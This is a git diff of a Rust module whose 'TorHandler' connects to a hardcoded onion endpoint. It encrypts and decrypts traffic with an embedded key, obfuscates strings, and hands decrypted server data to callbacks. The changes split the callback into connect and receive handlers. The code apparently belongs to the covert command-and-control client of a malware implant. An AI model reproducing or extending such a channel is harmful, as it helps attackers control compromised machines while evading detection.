@@ -2,11 +2,10 @@ use std::{ collections::VecDeque, path::PathBuf, sync::{ Arc, Mutex, RwLock }, t
 use anyhow::{ Context, Result };
 use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
 use obfstr::obfstr as s;
-use crate::{ ref_err, ref_log_internal, utils::encryption::sauron_encrypt };
+use crate::utils::encryption::sauron_encrypt;
 use crate::{
     constants::{ communication_encryption_key, onion_endpoint },
     logs::logger::Logger,
-    ref_tag,
     utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
 };
 use tokio::{ io::{ AsyncReadExt, AsyncWriteExt }, time::interval };
@@ -95,8 +94,10 @@ impl TorHandler {
 
         Ok(())
     }
-    pub async fn run<F>(&mut self, callback: F)
-        where F: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Copy + 'static
+    pub async fn run<CC, RC>(&mut self, connect_callback: CC, receive_callback: RC)
+        where
+            CC: FnMut() + Send + Sync + Clone + 'static,
+            RC: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Clone + 'static
     {
         let self_clone = self.clone();
         tokio::task::spawn_local(async move { self_clone.send_queue_task().await });
@@ -104,8 +105,11 @@ impl TorHandler {
         loop {
             match self.connect_to_endpoint().await {
                 Ok(()) => {
+                    // should send connect callback
+                    connect_callback.clone()();
+
                     loop {
-                        if let Err(error) = self.handle_receive(callback).await {
+                        if let Err(_error) = self.handle_receive(receive_callback.clone()).await {
                             // ref_err!(
                             //     self.logger.lock().unwrap(),
                             //     "Failed to handle_receive: ",
@@ -128,8 +132,8 @@ impl TorHandler {
             ).await;
         }
     }
-    async fn handle_receive<F>(&self, mut callback: F) -> Result<()>
-        where F: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Copy + 'static
+    async fn handle_receive<F>(&self, callback: F) -> Result<()>
+        where F: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Clone + 'static
     {
         loop {
             let data = self
@@ -137,6 +141,7 @@ impl TorHandler {
                 .context(s!("Failed to read_data from stream").to_string())?;
 
             let mut self_clone = self.clone();
+            let mut callback_clone = callback.clone(); // Clone the callback here
             tokio::task::spawn(async move {
                 if
                     let Ok(decrypted_data) = sauron_decrypt(
@@ -144,7 +149,8 @@ impl TorHandler {
                         &data
                     )
                 {
-                    if let Err(error) = callback(&mut self_clone, decrypted_data) {
+                    if let Err(_error) = callback_clone(&mut self_clone, decrypted_data) {
+                        //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
                         // ref_err!(
                         //     self_clone.logger.lock().unwrap(),
                         //     "Failed to process data via callback: ",
